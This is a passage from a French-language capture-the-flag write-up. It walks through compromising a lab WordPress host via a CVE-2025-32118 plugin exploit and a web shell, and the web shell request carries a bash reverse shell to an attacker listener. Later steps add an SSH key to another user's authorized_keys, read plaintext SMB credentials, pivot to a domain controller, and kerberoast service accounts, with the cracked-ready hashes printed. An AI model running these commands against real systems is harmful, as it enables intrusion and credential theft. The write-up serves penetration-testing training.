<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>python3<span class="w"> </span>CVE-2025-32118.py<span class="w"> </span>-u<span class="w"> </span>http://olympe.god/wordpress<span class="w"> </span>-un<span class="w"> </span>hermes<span class="w"> </span>-p<span class="w"> </span>mondieu
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1"># Ecoute sur un portattaquant</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>pwncat-cs<span class="w"> </span>:9001
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c1"># Envoie du payload</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>curl<span class="w"> </span><span class="s2">&quot;http://olympe.god/wp-content/plugins/cmp-premium-themes/nxploitedshell/nxploitedshell.php&quot;</span><span class="w"> </span>--get<span class="w"> </span>--data-urlencode<span class="w"> </span><span class="s2">&quot;cmd=bash -c &#39;sh -i &gt;&amp; /dev/tcp/192.168.56.1/9001 0&gt;&amp;1&#39;&quot;</span>
</code></pre></div>
<p>Une fois sur la machine. On trouve avec <code>getfacl</code> que l’on à un droit d’écriture sur l’authorized_keys de l’utilisateur <code>hermès</code>. </p>
<p>Ce dernier nous à laisser un message pour nous indiquer qu’il aimerai que l’on fasse tomber zeus. </p>
<p>Ainsi on peut utiliser ce fichier pour y mettre notre clé publique et obtenir un accès ssh à la machine en tant que <code>hermès</code>.</p>
<p>Une fois connecter en tant que hermes, on identifie un group étrange <code>smbscores</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>hermes@OlympeWordpress:/$ id
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>uid=1011(hermes) gid=1011(hermes) groupes=1011(hermes),1013(smbscores)
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>hermes@OlympeWordpress:/$ groups
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>hermes smbscores
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>hermes@OlympeWordpress:/$
</code></pre></div>
<p>Ainsi on peut voit qu’il n’y a qu’un seul autre utilisateur nomé dans ce groupe et que ce dernier permet de lire 2 fichier, <code>scores.txt</code> et <code>score_update.sh</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>find / -group smbscores 2&gt;/dev/null
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>/opt/scores/score_update.sh
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>/srv/pantheon.god
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>/srv/pantheon.god/scores
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>/srv/pantheon.god/scores/scores.txt
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>hermes@OlympeWordpress:/$ 
</code></pre></div>
<p>Bien qu’il n’y est rien dans le fichier <code>scores.txt</code> il y à tout de même des credentials danas le fichier <code>score_update.sh</code>. Cette fontionnalité permet d’update les scores des jeux sensé bientôt commencer et les envoyer vers un server sur l’ip <code>192.168.56.11</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>hermes@OlympeWordpress:/$ cat /srv/pantheon.god/scores/scores.txt
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>hermes@OlympeWordpress:/$ cat /opt/scores/score_update.sh
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>smbclient //192.168.56.11/scores -U &#39;smbscores%Sc0r3sS3rv1c3!2024&#39; -c &#39;put /srv/pantheon.god/scores/scores.txt scores.txt&#39;
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>hermes@OlympeWordpress:/$
</code></pre></div>
<p>n’ayant pas accès à cette ip, on place un agent ligolo-ng sur la machine avant d’utiliser nxc.</p>
<p>…</p>
<ul>
<li>
<p>nmap</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nmapfull 192.168.56.11
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-22 23:43 CEST
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Nmap scan report for 192.168.56.11
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Host is up (0.0015s latency).
<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>PORT      STATE SERVICE            VERSION
<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>22/tcp    open  ssh                OpenSSH for_Windows_9.5 (protocol 2.0)
<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>53/tcp    open  domain             Simple DNS Plus
<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2025-06-22 21:30:05Z)
<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>135/tcp   open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>| ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:pantheon-dc01.pantheon.god
<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>| Not valid before: 2025-06-21T19:24:38
<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>|_Not valid after:  2026-06-21T19:24:38
<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>|_ssl-date: TLS randomness does not represent time
<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>445/tcp   open  microsoft-ds?
<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>464/tcp   open  kpasswd5?
<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>636/tcp   open  ssl/ldap           Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>|_ssl-date: TLS randomness does not represent time
<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>| ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:pantheon-dc01.pantheon.god
<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>| Not valid before: 2025-06-21T19:24:38
<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>|_Not valid after:  2026-06-21T19:24:38
<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>| ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
<a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:pantheon-dc01.pantheon.god
<a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>| Not valid before: 2025-06-21T19:24:38
<a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>|_Not valid after:  2026-06-21T19:24:38
<a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>|_ssl-date: TLS randomness does not represent time
<a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>3269/tcp  open  ssl/ldap           Microsoft Windows Active Directory LDAP (Domain: pantheon.god0., Site: Default-First-Site-Name)
<a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>| ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
<a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:pantheon-dc01.pantheon.god
<a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a>| Not valid before: 2025-06-21T19:24:38
<a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>|_Not valid after:  2026-06-21T19:24:38
<a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a>|_ssl-date: TLS randomness does not represent time
<a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a>3389/tcp  open  ssl/ms-wbt-server?
<a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a>| rdp-ntlm-info:
<a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a>|   Target_Name: PANTHEON
<a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a>|   NetBIOS_Domain_Name: PANTHEON
<a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a>|   NetBIOS_Computer_Name: PANTHEON-DC01
<a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a>|   DNS_Domain_Name: pantheon.god
<a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a>|   DNS_Computer_Name: pantheon-dc01.pantheon.god
<a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a>|   DNS_Tree_Name: pantheon.god
<a id="__codelineno-8-47" name="__codelineno-8-47" href="#__codelineno-8-47"></a>|   Product_Version: 10.0.26100
<a id="__codelineno-8-48" name="__codelineno-8-48" href="#__codelineno-8-48"></a>|_  System_Time: 2025-06-22T21:31:56+00:00
<a id="__codelineno-8-49" name="__codelineno-8-49" href="#__codelineno-8-49"></a>|_ssl-date: TLS randomness does not represent time
<a id="__codelineno-8-50" name="__codelineno-8-50" href="#__codelineno-8-50"></a>| ssl-cert: Subject: commonName=pantheon-dc01.pantheon.god
<a id="__codelineno-8-51" name="__codelineno-8-51" href="#__codelineno-8-51"></a>| Not valid before: 2025-06-20T19:19:22
<a id="__codelineno-8-52" name="__codelineno-8-52" href="#__codelineno-8-52"></a>|_Not valid after:  2025-12-20T19:19:22
<a id="__codelineno-8-53" name="__codelineno-8-53" href="#__codelineno-8-53"></a>5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<a id="__codelineno-8-54" name="__codelineno-8-54" href="#__codelineno-8-54"></a>|_http-title: Not Found
<a id="__codelineno-8-55" name="__codelineno-8-55" href="#__codelineno-8-55"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
<a id="__codelineno-8-56" name="__codelineno-8-56" href="#__codelineno-8-56"></a>9389/tcp  open  mc-nmf             .NET Message Framing
<a id="__codelineno-8-57" name="__codelineno-8-57" href="#__codelineno-8-57"></a>47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<a id="__codelineno-8-58" name="__codelineno-8-58" href="#__codelineno-8-58"></a>|_http-title: Not Found
<a id="__codelineno-8-59" name="__codelineno-8-59" href="#__codelineno-8-59"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
<a id="__codelineno-8-60" name="__codelineno-8-60" href="#__codelineno-8-60"></a>49664/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-61" name="__codelineno-8-61" href="#__codelineno-8-61"></a>49665/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-62" name="__codelineno-8-62" href="#__codelineno-8-62"></a>49666/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-63" name="__codelineno-8-63" href="#__codelineno-8-63"></a>49667/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-64" name="__codelineno-8-64" href="#__codelineno-8-64"></a>49668/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-65" name="__codelineno-8-65" href="#__codelineno-8-65"></a>49670/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-66" name="__codelineno-8-66" href="#__codelineno-8-66"></a>49672/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-67" name="__codelineno-8-67" href="#__codelineno-8-67"></a>49682/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-68" name="__codelineno-8-68" href="#__codelineno-8-68"></a>49683/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
<a id="__codelineno-8-69" name="__codelineno-8-69" href="#__codelineno-8-69"></a>49687/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-70" name="__codelineno-8-70" href="#__codelineno-8-70"></a>49698/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-71" name="__codelineno-8-71" href="#__codelineno-8-71"></a>51019/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-72" name="__codelineno-8-72" href="#__codelineno-8-72"></a>56277/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-73" name="__codelineno-8-73" href="#__codelineno-8-73"></a>56321/tcp open  msrpc              Microsoft Windows RPC
<a id="__codelineno-8-74" name="__codelineno-8-74" href="#__codelineno-8-74"></a>MAC Address: 08:00:27:BA:71:77 (Oracle VirtualBox virtual NIC)
<a id="__codelineno-8-75" name="__codelineno-8-75" href="#__codelineno-8-75"></a>Service Info: Host: PANTHEON-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
<a id="__codelineno-8-76" name="__codelineno-8-76" href="#__codelineno-8-76"></a>
<a id="__codelineno-8-77" name="__codelineno-8-77" href="#__codelineno-8-77"></a>Host script results:
<a id="__codelineno-8-78" name="__codelineno-8-78" href="#__codelineno-8-78"></a>|_clock-skew: mean: -13m20s, deviation: 0s, median: -13m20s
<a id="__codelineno-8-79" name="__codelineno-8-79" href="#__codelineno-8-79"></a>| smb2-security-mode:
<a id="__codelineno-8-80" name="__codelineno-8-80" href="#__codelineno-8-80"></a>|   311:
<a id="__codelineno-8-81" name="__codelineno-8-81" href="#__codelineno-8-81"></a>|_    Message signing enabled and required
<a id="__codelineno-8-82" name="__codelineno-8-82" href="#__codelineno-8-82"></a>|_nbstat: NetBIOS name: PANTHEON-DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 080027ba7177 (Oracle VirtualBox virtual NIC)
<a id="__codelineno-8-83" name="__codelineno-8-83" href="#__codelineno-8-83"></a>| smb2-time:
<a id="__codelineno-8-84" name="__codelineno-8-84" href="#__codelineno-8-84"></a>|   date: 2025-06-22T21:31:56
<a id="__codelineno-8-85" name="__codelineno-8-85" href="#__codelineno-8-85"></a>|_  start_date: N/A
<a id="__codelineno-8-86" name="__codelineno-8-86" href="#__codelineno-8-86"></a>
<a id="__codelineno-8-87" name="__codelineno-8-87" href="#__codelineno-8-87"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<a id="__codelineno-8-88" name="__codelineno-8-88" href="#__codelineno-8-88"></a>Nmap done: 1 IP address (1 host up) scanned in 102.80 seconds
</code></pre></div>
</li>
</ul>
<p>On vois avec <code>netexec</code> que l’on à affaire à un domain contrôleur.</p>
<p>Ainsi on oublie pas rajouter les information du domaine dans /etc/hosts et /etc/krb5.conf. Et pour ce faire on peut utiliser <code>netexec</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>[smbscores@pantheon.god][Jun 22, 2025 - 23:48:03 (CEST)] exegol-pantheon_wu writeup # nxc smb &quot;$IP&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; --generate-hosts /etc/hosts
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>[smbscores@pantheon.god][Jun 22, 2025 - 23:48:07 (CEST)] exegol-pantheon_wu writeup # nxc smb &quot;$IP&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; --generate-krb5 /etc/krb5.conf
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
</code></pre></div>
<p>On peut tenter des attaque classique de l’active directory tel que l’<code>asreprosting</code> ou  <code>kerberoasting</code> qui justement nécessite des identifiant valide pour être exécuter.
Cela nous permet de récupérer 3 utilisateur <code>kerberoastable</code>, notre utilisateur courant <code>smbscores</code>  dont on connais déjà le mots de pass, le service <code>svc_thunderB$</code>, et le service hercule qui semble être au vue du nom, un compte utilisateur fessant office de compte de service, donc potentiellement un utilisateur avec un mots de pass faible et <code>bruteforçable</code>. </p>
<p>D’ailleurs on peut voir que <code>svc_thunderB$</code> est un <code>gmsa</code> que seul les utilisateur membre du groupe <code>OLYMPE-SERVICES-MANAGERS</code> peuvent obtenir le mots de passe.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nxc ldap &quot;$IP&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; --gmsa
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>LDAP        192.168.56.11   389    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:Enforced) (channel binding:When Supported)
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>LDAP        192.168.56.11   389    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>LDAP        192.168.56.11   389    PANTHEON-DC01    [*] Getting GMSA Passwords
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>LDAP        192.168.56.11   389    PANTHEON-DC01    Account: svc_thunderB$        NTLM: &lt;no read permissions&gt;       PrincipalsAllowedToReadPassword: OLYMPE-SERVICES-MANAGERS
</code></pre></div>
<ul>
<li>
<p>Pour effectuer une attaque <code>kerberoasting</code> on doit ce synchronise avec le DC puis on peux utiliser <code>netexec</code> pour effectuer l’attaque.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>faketime &quot;$(rdate -n $IP -p | awk &#39;{print $2, $3, $4}&#39; | date -f - &quot;+%Y-%m-%d %H:%M:%S&quot;)&quot; zsh
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>[smbscores@pantheon.god][Jun 22, 2025 - 23:40:10 (CEST)] exegol-pantheon_wu writeup # nxc ldap &quot;$IP&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; --kerberoast Kerberoastables.txt --port 636
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 (name:PANTHEON-DC01) (domain:pantheon.god)
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    [+] pantheon.god\smbscores:Sc0r3sS3rv1c3!2024
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    Bypassing disabled account krbtgt
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    [*] Total of records returned 16
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    sAMAccountName: svc_thunderB$ memberOf:  pwdLastSet: 2025-06-21 21:33:28.483382 lastLogon:&lt;never&gt;
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    $krb5tgs$18$svc_thunderB$$PANTHEON.GOD$*pantheon.god/svc_thunderB$*$b892c7289757c281b495c1d7$5cd2a3bbb76b2eab9d2db9cbc0997bb02f12f309e133bb9661fa357eac918ef779a6371854a144d48c9c3edb72aae30e35e910141732061000b9d8ef8d453c6efd4f3ae169226f988794530c4d65e9dc821a69c2d8a0b2e05524a37d02cdc89f089f766009d39f6e1a029cc71d70427aaf98e21bdb445a41181e8159879c70671f31490ef4c01b8ae2d4631f156de52947c43474465b5bb2e2e1657991ba5570b0f75f25af78d1c6ca7a48d6427873669fad6df1665f2bbaffbf4fded6c7c3cd6b1d900d5768fb0f6ff1f7f78c5137fc1aa92ce963902cf9a44aeab17537715cea58f3903c9b663b62fa121dcbbf2e44d93a6b1b01d061ad575c3372a4e7951b0182f8112c8342073bac6de95ece585d18b909b9dff856766d35ce7748d8242d624da53a4a6a8c4223492949ea439d3e049c234c4e4612575b6c47fa530742fc563cfa9b39e770916a47e3d5e031c26bf46284f55f2bbaa30a3b29b3462d91cba0f0e8717ce9a1a55d09ace6c44ab5f37b50cf88d700776dcbaef2d15cb44075d8fc5260b25538a63b9f13b118592f81c6c0b6afdd03b1b0e7f9b0e1a9f3a72d813a14ae9088e65dedad8ebda78125dba743cca9494c5e886144f399e66a786428b3087b3a7902f9475f3e9851ce97ddad708fa8c528286051cbe2f239700329252c620247a3873e2d89dd2f0f26319f011be542161a373088aee9a404fc9d0e0523f59364956210e84ecc4b813fb7a252a1a88240c5e0df3b8d2eff05c06d159556b7190f1ea09169872482a0d1624b5db340c522c76ae59e379833fd939bd0375ffbf5e1e83daed3dae32bffc8a563244dc7157d5a1897a74c5448070214c718f7fc746c97e9a83fc507afcb7e8e92af2441e9dc63ee1541734284e88b7e55821b6bd128229272ab35eee90d6e05480aae455a3812060a223119f91656d163154d3db35e6f64fe2625409b56b580effc9f816e2baeea05a5c2da6e5566dd7f63045c38fe954b8c4d812046d79d7ee1611091fa2174f72a25e24786877ed423e39ea7b9fbb3e1ff49d5f7650734b9c0fce605c2734e55ba5aaea0928f7ff497d9f1c36d6c5387112adaf8a5213604d01d92071b5fe72b7945fa85ab41c054af19e1f116c55349009b35877447a0b921489b66f9e01283ca5f4cb576f1e7a38cde0707d6c5384228c4edec36904e393fcd0b3ffa969818f1063e0bb800a33d3d96380a28e254b30bd5f0d465fd65548164e20d6ec6a22359dc79a1d80fb3a8993835376ea690cdba410b94cc198c2966ac8a6212eb93256ad7148ec22377452a0f9ea02fec233c5a7977fe4a01be5bcd4e0043934ed822e0d5c19c5ac3806e85c7659b35d957990458c9a075f16f4158b605bf1319a5f2f3d7289dcbe224659fa49e04a7c6d30d81a03056134946f8dcac47da2a330ca2361db6892c8297bb47be2b61974f23e5caadbad16a128ab60e28e45d715f3c4740da3e3cad59f62c2d81ce13b4050c926949c81db1006188bb35378bb70e90d74117099fe26617
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    sAMAccountName: hercule memberOf: CN=OLYMPE-IMORTAL-HEROS,OU=OLYMPIENS,DC=pantheon,DC=god pwdLastSet: 2025-06-21 21:37:10.735902 lastLogon:&lt;never&gt;
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    $krb5tgs$23$*hercule$PANTHEON.GOD$pantheon.god/hercule*$aa9ccd3d56303ff1475981267ff6a9b8$2f7bcb43d4d4587dbc1c625599553784d26a2347a5bd7a9f056b7e7d2b9f6d31bb93173e824ebcffed3e6b01103eb5a8e9827bd8455a373a50faa5fe0fd21725a0f2ae080a8e4c3fbaccfb41fc642f74e8238ff9b646718bcd59411926f2a6442a2d539440b0599f4fd3c7fb797332c7e09de70ada10af736cb837abc595a65cbe561b7fcc8c41aa2b2329af3eac8e5085e260d4c06fe622497a01383580801fb7152b3b90a04854b88dfe88a6ac472402c192b71c6b4b5bb5586ff655e4b54e713bb08ecb77dd50edd93f3a919df5ad700c54f20cb2647ef9f2fb997dd6627fcbd8c62b37e0da4cd4cb06d676ea48ad6628e3f52ef401e793b7b2049a2c8b068da21d377c8b41fa42aa22f37281f19c3aa4a45b26242669d32425f05b565e9f2a581ee45ca275101cb87fedb909a1c240480cfb8f0cb2d59ae4615ecb7ec30d6ca307a56d48ef022fa16f3b2e4abf4bf89060df5bc940ad1dff7f5d5419cd30c910360f830a493f6150f4651cd1b5a986f09b479c540ed1e0bcd86293e02e456181d2f59ec19a01f0396f3c56c72d75ee5a3d0394509bebc34f78f17c2f59a265eed0942bb08327b5d0074d7631e3bd13b5371e40b23ccf8f59ceb7a6ea2bd2f88673362442e62155452b19d3b88ee6c55a3970e73dd47c44f6b025bf4db0a226302d85f01403b2ea8ac0e5f04a94e0ab8a3de141342e3e62c8111ac6bacbb199970549916f814a1ddbad28c8e59deb989c7f22ddf207334a3e655ead0284a504c3ddfd5eca1491a1c10b0d1b60eaa1e2a4dddbec8ffa3262326091406e486682f3b46b0389ec7b42a7ee80c08552c83b9df8d7e72da16d8381bd65fcfe4a60e2a5214877573af59064d894b03236941ac851cb13ad54d2bbe6fd3220cf63f61cc14dfbbee922ded7613d373ca1f58912babadaaae4788fcdb5bf5c8109dd6695301bad72dec1364187ee2759b7743ed7340e960cdfe832dca8c12f055e970348704dfe6df3857c46132b126b44dd7b2c0e21452fdf6f88dba351ab4cc27f08eace50ed6e1eb564b61fddefa2f014ed6c76769078846726e3f596fc60269dc44f0038c575fac8ff5877583f1bb2463e3f4978c19396a4ca54c54896d0ceaf841d9354dbb3ae117816c51804d95fa2f4ede4c60d3a372b90cace99b26fbe92624da58676e68b4e15e4ed5e73178b73bb726f44609a60afbd6c461c6489d7119b9fc8babebb85285d0c75c05250cfd218fcafe07a2754e076b67033d3f4f32ebead3e97332569b48a2e0ccbaee31e5913d1886c2fc2e8982386feabdcaeb0f6b51273830ecd6cb85fbe0bcd237dbddebf029335fc24d90ccaa2faf86c7eb2981e2588039f3b5534ba1c48505fcabbd5678c1f8664f517f39c0de8ac3ed00f696ccecf01b36914a0c0bea2f804c540b0c8e460b16c7c7c9e16ccc365d788b2f59daff3abe406a9deea327424146091cda71d83327b5192113f5f644576b126121a5424a1a6da0e62de340f23f5c1e5631c876b578b6b02da43e3ad408e7124
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>LDAPS       192.168.56.11   636    PANTHEON-DC01    sAMAccountName: smbscores memberOf:  pwdLastSet: 2025-06-21 21:37:03.510375 lastLogon:&lt;never&gt;
